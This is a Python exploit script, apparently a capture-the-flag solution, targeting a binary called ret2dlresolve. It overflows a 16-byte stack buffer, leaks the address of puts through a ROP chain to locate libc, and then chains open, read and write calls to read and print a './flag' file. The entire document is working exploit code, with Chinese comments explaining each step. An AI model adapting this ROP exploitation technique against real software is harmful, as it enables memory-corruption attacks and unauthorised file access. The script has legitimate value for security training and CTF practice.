import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
set_config(GameBoxConfig(
    is_local=True,
    file='./ret2dlresolve',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))

s = sgtlibc.Searcher()
elf = client.elf
rop = ROP(elf)

libc_path = '/lib/x86_64-linux-gnu/libseccomp.so.2'
flag_path = './flag\x00\x00'
bss_addr = 0x601800
main_addr = elf.symbols['main']
file_description = 3  # 需要根据当前fd值修改


def exp():
    # overflow position
    data = [b'a' * (16), fakeebp()]
    return data




def leak(func: str):
    log.warning(f'start leak {func}')

    payload = [exp(), elf.rop['rdi'], elf.got[func],
               elf.plt['puts']]
    payload += [[elf.rop['ret']] * 1]
    payload += [main_addr]
    sa(b'welcome\n', payload)
    # ru('input:\n')
    # ru(fakeebp())  # 如果有输出则清空缓存
    data = rc(6).ljust(8, b'\0')
    data = u00(data)
    log.info(f'leak {func}:{hex(data)}')
    s.add_condition(func, data)
    return data


# 注意：泄露的函数应在泄露之前至少执行过一次，否则函数地址不准确
addr = leak('puts')

libc = sgtlibc.ROPgadgets.ELF(libc_path, checksec=False)
libc.get_rop()

puts_libc_addr = libc.symbols['puts']
offset = addr - libc.symbols['puts']
open_addr = libc.symbols['open'] + offset
write_addr = libc.symbols['write'] + offset
success(f'write_addr:{hex(write_addr)}')
success(f'open_addr:{hex(open_addr)}')


def exp_control_rdirsirdx(rdi: int, rsi: int, rdx: int, r15: int = 0):
    payload = []
    payload += [elf.rop['rdi'], rdi]
    payload += [elf.rop['rsi_r15'], rsi, r15]  # csu必然有
    payload += [libc.rop['rdx'] + offset, rdx]
    return payload


payload = exp()

# 写入flag字符串到bss
payload += exp_control_rdirsirdx(0, bss_addr, len(flag_path))
payload += [elf.plt['read']]

# 打开flag文件
payload += exp_control_rdirsirdx(bss_addr, 0, 0)
payload += [open_addr]

# 读取flag内容
payload += exp_control_rdirsirdx(file_description, bss_addr, 0x100)
payload += [elf.plt['read']]

# 打印flag
payload += exp_control_rdirsirdx(1, bss_addr, 0x100)
payload += [write_addr]

se(payload)

sleep(0.5)
se(flag_path)
interactive()
